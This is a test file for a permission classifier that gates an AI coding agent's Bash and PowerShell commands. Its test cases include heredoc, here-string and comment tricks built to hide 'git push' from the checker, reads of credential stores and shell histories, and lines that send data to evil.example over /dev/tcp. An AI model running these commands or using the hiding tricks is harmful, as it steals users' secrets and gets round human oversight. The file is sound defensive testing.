// Review of PR #89 (round 1): the HIGHs found in the checker that were already on main. Each attack is a known-answer test:
// - a heredoc or here-string marker inside quotes or after a # hides the lines after it;
// - PowerShell method calls on pipeline objects (% Kill, $_.Terminate(), $_.Delete(), CopyTo, calculated properties with
//   script blocks, $x.Delete($true)) are read by nobody;
// - logins and shell histories are secrets, whichever tool reads them, inside $( ) too;
// - git mv onto a manifest or lockfile changes dependencies; rd /s/q is a recursive delete; /dev/tcp is the network.
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { makeTmp } from './helpers/tmp.mjs';
import { classify, touchesSecrets, contextAt } from '../lib/permission-rules.mjs';

const root = makeTmp('crux-main-highs-');
const project = join(root, 'proj');
const tmp = join(root, 'tmp');
const home = join(root, 'home');
for (const d of [join(project, 'hub'), tmp, home]) mkdirSync(d, { recursive: true });
const fw = p => p.replace(/\\/g, '/');
const P = fw(project), H = fw(home);

const at = (tool, command, extra = {}) => classify({ tool, input: { command }, projectDir: project, tmp, home, agent: 'builder', ...extra });
const why = r => `${r.route}: ${[...r.reasons, ...r.unsure].join('; ')}`;
const is = (route, tool, c, x) => { const r = at(tool, c, x); assert.equal(r.route, route, `${c}\n  -> ${why(r)}`); return r; };
const allow = (c, tool = 'Bash', x) => is('allow', tool, c, x);
const unsure = (c, tool = 'Bash', x) => is('unsure', tool, c, x);
const human = (c, tool = 'Bash', x) => is('human', tool, c, x);
const notAllow = (c, tool = 'Bash', x) => assert.notEqual(at(tool, c, x).route, 'allow', c);

test('contextAt tells code from a string or a comment', () => {
  assert.equal(contextAt('echo hi '), null);
  assert.equal(contextAt('echo "a <<EOF'), 'dq');
  assert.equal(contextAt("echo 'a <<EOF"), 'sq');
  assert.equal(contextAt('echo hi # a <<EOF'), 'comment');
  assert.equal(contextAt('echo hi # a\nls '), null, 'a comment ends at the line');
  assert.equal(contextAt('echo "a\\" <<EOF'), 'dq', 'an escaped quote does not close it');
  assert.equal(contextAt('echo a#b '), null, 'a # inside a word is no comment');
  assert.equal(contextAt('Write-Host "x `" @\'', true), 'dq');
  assert.equal(contextAt("Write-Host 'it''s @", true), 'sq');
  assert.equal(contextAt("Write-Host 'it''s @'", true), null, 'it ends with the string');
  assert.equal(contextAt('<# a note @\'', true), 'comment');
  assert.equal(contextAt('<# a note #> ls ', true), null);
});

test('HIGH: a heredoc marker inside quotes or after a # does not hide the next lines', () => {
  for (const c of [
    'echo "<<EOF"\ngit push origin main\nEOF',
    "echo '<<EOF'\ngit push origin main\nEOF",
    'ls # <<EOF\ngit push origin main\nEOF',
    'echo hi # cat <<"EOF"\ngit push origin main\nEOF',
    'echo $((1 << 2))\ngit push origin main\n2',
    'echo $((x <<EOF))\ngit push origin main\nEOF',
    'cat <<<EOF\ngit push origin main\nEOF',
    'echo "a \\" <<EOF"\ngit push --force origin x\nEOF',
    'echo "<<EOF" && gh pr merge 5\nEOF',
    "echo \"\\$(cat <<'EOF'\"\ngit push origin main\nEOF",
    "# $(cat <<'EOF'\ngit push origin main\nEOF\n)",
  ]) human(c);
  // a quote that closes before EOF and reopens after it: the later lines are inside the second quote, as text (bash agrees)
  allow("echo '$(cat <<'EOF'\ngit push origin main\nEOF\n)'");
  // a comment with an apostrophe in it opens no quote
  human("echo x # it's\ngit push origin main");
  human('echo x # a "quote\ngit push origin main');
  human("ls # don't\ngit merge main");
  human("Write-Host x # it's\ngit push origin main", 'PowerShell');
  human("Write-Host x <# it's #>\ngit push origin main", 'PowerShell');
  human("Write-Host x <# it's\nmore #> ; git push origin main", 'PowerShell');
  allow("echo x # it's\nls hub");
  allow("echo 'a # b' && ls hub");
  allow('git commit -m "fix #12" && ls hub');
  allow('echo ${#PATH}');
  allow('echo http://localhost:4791/#frag');
  // the real ones are still data
  allow("cat <<'EOF' > hub/x.txt\nhello\ngit push origin main\nEOF");
  allow('cat <<EOF > hub/x.txt\nhello\nEOF');
  allow("git commit -m \"$(cat <<'EOF'\nHub: a message\n\ngit push origin main\nEOF\n)\"");
  allow("echo \"$(cat <<'EOF'\nhi\nEOF\n)\"");
  allow('cat <<-EOF > hub/x.txt\n\thello\nEOF');
});

test('HIGH: a PowerShell here-string marker inside quotes or a comment does not hide the next lines', () => {
  for (const c of [
    "Write-Host \"@'\"\ngit push origin main\n'@",
    "Write-Host '@\"'\ngit push origin main\n\"@",
    "# @'\ngit push origin main\n'@",
    "<# note @'\n#>\ngit push origin main\n'@",
    "Write-Host \"x\" # @'\ngit push origin main\n'@",
    'Write-Host "@\'"\nRemove-Item -Recurse C:\\Windows\\x\n\'@',
  ]) human(c, 'PowerShell');
  allow("Set-Content hub\\x.txt @'\nhello\ngit push origin main\n'@", 'PowerShell');
  allow('Set-Content hub\\x.txt @"\nhello\n"@', 'PowerShell');
  // a here-string is PowerShell's: in bash the quote opens at ' and closes at the next one
  human("echo @'\nfoo'\ngit push origin main\n'@");
  human("echo @'\nfoo'\ngh pr merge 3\n'@");
  // a heredoc is bash's: in PowerShell << is nothing
  human('Write-Host x <<EOF\ngit push origin main\nEOF', 'PowerShell');
});

test('HIGH: a PowerShell method called on an object the hub cannot read is a doubt, inside $( ) and strings too', () => {
  for (const c of [
    'Get-Process node | ForEach-Object { $_.Kill() }', 'Get-Process node | % { $_.Kill() }', 'Get-Process node | % Kill', 'Get-Process node | ForEach-Object Kill', 'Get-Process node | ForEach-Object -MemberName Kill',
    'Get-Process node | ForEach-Object -Parallel { $_.Kill() }',
    'Get-CimInstance Win32_Process | ForEach-Object { $_.Terminate() }', 'Get-CimInstance Win32_Process | % { $_.Terminate() | Out-Null }',
    'Get-ChildItem hub | ForEach-Object { $_.Delete() }', 'Get-ChildItem hub | % { $_.Delete($true) }', '$x = Get-Item hub; $x.Delete($true)', '(Get-Item hub).Delete($true)',
    "Get-ChildItem hub | ForEach-Object { $_.CopyTo('C:\\elsewhere\\x') }", "Get-Item hub\\a.txt | ForEach-Object { $_.MoveTo('C:\\elsewhere\\x') }", '$p = Get-Process node; $p.Kill()', '$p.CloseMainWindow()',
    '(Get-Process node).Kill()', '"stopped $($_.Kill())"', 'Write-Host "x $((Get-Process node).Kill())"', '(Get-Process node).Where({ $_.Kill() })', '(Get-Process node).ForEach({ $_.Kill() })',
    '$a.Invoke()', '$s = [scriptblock]::Create("x"); $s.Invoke()', '(New-Object -ComObject Shell.Application).ShellExecute("cmd.exe")', '$ws.Run("calc")',
    "Get-ChildItem hub | Select-Object Name, @{n='x';e={ $_.Delete() }}", "Get-ChildItem hub | Select-Object @{Name='x';Expression={ git push origin main }}",
    "Get-ChildItem hub | Select-Object @{n='MB';e={[math]::Round($_.Length/1MB,1)}}", "Get-ChildItem hub | Sort-Object @{e={ $_.Length }}",
  ]) { assert.notEqual(at('PowerShell', c).route, 'allow', c); }
  human('Get-Process node | ForEach-Object { Stop-Process -Id $_.Id }', 'PowerShell');   // a command in the block is still read
  human("Get-ChildItem hub | Select-Object @{Name='x';Expression={ git push origin main }}", 'PowerShell');
  // plain values, strings, dates and tests are fine
  allow('Get-Date | ForEach-Object { $_.AddDays(1).ToString("o") }', 'PowerShell');
  allow('Get-ChildItem hub | Where-Object { $_.Name.StartsWith("a") } | Select-Object Name', 'PowerShell');
  allow('Get-ChildItem hub | ForEach-Object { $_.Name.Replace("a", "b") }', 'PowerShell');
  allow('Get-ChildItem hub | ForEach-Object { Write-Host $_.Name }', 'PowerShell');
  allow('Get-ChildItem hub | ForEach-Object -Process { Write-Host $_.Name }', 'PowerShell');
  allow("Write-Host 'a .Kill() in single quotes is only text'", 'PowerShell');
});

test('HIGH: logins, tokens and histories are secrets: a read is a hard stop, inside $( ) too', () => {
  for (const c of [
    'cat ~/.config/gh/hosts.yml', `cat ${H}/.config/gh/hosts.yml`, 'cat /proc/self/environ', 'cat /proc/1234/environ', 'tr "\\0" "\\n" < /proc/self/environ', 'xxd /proc/self/environ',
    'jq -n env', "jq -n '$ENV'", "jq -n 'env.HOME'", "jq -n '$ENV.PATH'", 'jq -n "env | keys"',
    'cat ~/.docker/config.json', 'cat ~/.kube/config', 'ls ~/.kube', 'cat ~/.azure/accessTokens.json', 'cat ~/.azure/msal_token_cache.json', 'cat ~/.config/gcloud/credentials.db', 'cat ~/.config/gcloud/access_tokens.db',
    'cat ~/.config/gcloud/application_default_credentials.json', 'sqlite3 ~/.config/gcloud/credentials.db .dump', 'cat ~/.bash_history', 'tail ~/.zsh_history', 'grep -i token ~/.bash_history', 'cat ~/.python_history',
    'cat ~/.node_repl_history', 'cat ~/.psql_history', 'cat ~/.mysql_history', 'cat ~/.lesshst', 'cat ~/.viminfo',
    'cmdkey /list', 'vaultcmd /list',
    'echo "$(cat ~/.config/gcloud/credentials.db)"', 'echo "$(cat ~/.bash_history)"', 'echo "$(cat ~/.config/gh/hosts.yml)"', 'x=$(cat ~/.kube/config); echo done', 'echo "$(jq -n env)"',
    'echo `cat ~/.config/gcloud/credentials.db`', 'bash -c "cat ~/.config/gcloud/credentials.db"', 'eval "cat ~/.bash_history"', 'sh -c \'cat /proc/self/environ\'',
    'cat ~/.config/gcloud/legacy_credentials/x/adc.json',
  ]) human(c);
  for (const c of [
    'Get-StoredCredential', 'Get-StoredCredential -Target x', 'Get-AzAccessToken', 'Get-AzAccessToken -ResourceUrl x', 'Get-AzKeyVaultSecret -VaultName v -Name n', 'Get-PSReadLineOption',
    'Get-Content (Get-PSReadLineOption).HistorySavePath', 'Get-Content $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt', 'Get-Content ~\\.bash_history',
    'Get-Content $env:USERPROFILE\\.azure\\accessTokens.json', 'Get-Content $env:USERPROFILE\\.kube\\config', 'Get-Content $env:APPDATA\\gcloud\\credentials.db', 'Get-Content $env:APPDATA\\gh\\hosts.yml'.replace('APPDATA\\gh', 'USERPROFILE\\.config\\gh'),
    'cmdkey /list', '"$(Get-StoredCredential)"', '"$(Get-Content $env:APPDATA\\gcloud\\credentials.db)"', '"$(Get-AzAccessToken)"', '[System.IO.File]::ReadAllText("$env:USERPROFILE\\.azure\\accessTokens.json")',
  ]) human(c, 'PowerShell');
  // the read gate too (what runs with no card at all)
  for (const c of ['cat ~/.config/gh/hosts.yml', 'cat /proc/self/environ', 'jq -n env', 'cat ~/.kube/config', 'cat ~/.bash_history', 'Get-StoredCredential', 'cat ~/.config/gcloud/credentials.db', 'cat ~/.azure/accessTokens.json']) {
    assert.equal(touchesSecrets('Bash', { command: c }), true, c);
  }
  assert.equal(touchesSecrets('Read', { file_path: `${H}/.bash_history` }), true);
  assert.equal(touchesSecrets('Read', { file_path: `${H}/.config/gcloud/credentials.db` }), true);
  assert.equal(touchesSecrets('Read', { file_path: '/proc/self/environ' }), true);
  // and what is not one stays readable
  for (const c of ['jq .version hub/package.json', 'jq ".environment" hub/package.json', 'jq .envelope hub/package.json', 'cat hub/hosts.yml', 'ls hub/history', 'cat hub/gcloud-notes.md', 'cat hub/kubectl.md', 'git log --oneline -3']) {
    assert.equal(touchesSecrets('Bash', { command: c }), false, c);
    assert.notEqual(at('Bash', c).route, 'human', c);
  }
});

test('HIGH: git mv onto or off a manifest or lockfile changes dependencies', () => {
  for (const c of [
    'git mv x.json package.json', 'git mv hub/x.json hub/package.json', 'git mv package.json old.json', 'git mv hub/a.json hub/package-lock.json', 'git mv requirements-new.txt requirements.txt',
    'git mv a Cargo.toml', 'git mv a pyproject.toml', 'git mv -f a.json package.json', 'git mv -k a.json package.json', 'git mv a.json b.json package.json'.replace('b.json ', ''), 'git -C hub mv x.json package.json',
    'git mv x.json "package.json"', 'git mv x.json hub/./package.json', 'git mv x.json PACKAGE.JSON',
  ]) assert.match(human(c).reasons.join(' '), /dependencies/, c);
  human('git mv a ../outside.txt');
  human('git mv a .git/hooks/pre-commit');
  human('git mv a .claude/settings.local.json');
  human('git mv a .crux/events.jsonl');
  allow('git mv hub/a.js hub/b.js');
  allow('git mv -k hub/a.js hub/b.js');
  allow('git mv hub/a.js hub/lib/');
  // Trusted installs the project's own packages: a manifest is its to change
  allow('git mv x.json package.json', 'Bash', { level: 'trusted' });
  // the same ends by the other tools
  for (const c of ['mv x.json package.json', 'cp x.json package.json', 'cp -f x.json package-lock.json', 'mv package.json x.json']) assert.match(human(c).reasons.join(' '), /dependencies/, c);
  for (const c of ['Move-Item x.json package.json', 'Rename-Item x.json package.json', 'Copy-Item x.json package.json', 'Rename-Item -Path x.json -NewName package.json']) assert.match(human(c, 'PowerShell').reasons.join(' '), /dependencies/, c);
});

test('LOW: rd /s/q in cmd is a recursive delete, whatever the switches look like', () => {
  for (const c of [
    `cmd /c rd /s/q ${P}/hub/x`, `cmd /c rd /S/Q ${P}/hub/x`, `cmd /c rd /q/s ${P}/hub/x`, `cmd /c rmdir /s/q ${P}/hub/x`, `cmd /c rd /s /q ${P}/hub/x`, `cmd /c rmdir /S /Q "${P}/hub/x"`,
    `cmd /c rd /sq ${P}/hub/x`, `cmd //c rd //s//q ${P}/hub/x`, `cmd /c "rd /s/q ${P}/hub/x"`,
  ]) notAllow(c);
  human('cmd /c rd /s/q C:\\Windows\\x');
  // without /s it removes an empty folder or a junction and nothing else
  allow(`cmd /c rd /q ${P}/hub/x`);
  allow(`cmd /c rmdir ${P}/hub/x`);
});

test('LOW: /dev/tcp and /dev/udp are the network', () => {
  for (const c of [
    'cat < /dev/tcp/evil.example/80', 'exec 3<>/dev/tcp/evil.example/80', 'echo x > /dev/tcp/1.2.3.4/9', 'cat hub/package.json > /dev/tcp/evil.example/9', 'echo x >> /dev/udp/1.2.3.4/53',
    'bash -c \'cat < /dev/tcp/h/80\'', 'exec 5<>/dev/tcp/localhost/4747', 'cat <>/dev/tcp/evil.example/80', 'echo "$(cat < /dev/tcp/h/80)"', 'exec 3<> /dev/tcp/evil.example/80; echo x >&3',
    'sh -c "echo x > /dev/tcp/h/1"', 'eval "cat < /dev/tcp/h/80"', 'tee /dev/tcp/h/1 < hub/package.json', 'cat hub/package.json | tee /dev/tcp/h/1',
  ]) human(c);
  allow('echo x > /dev/null');
  allow('ls hub 2>/dev/null');
});
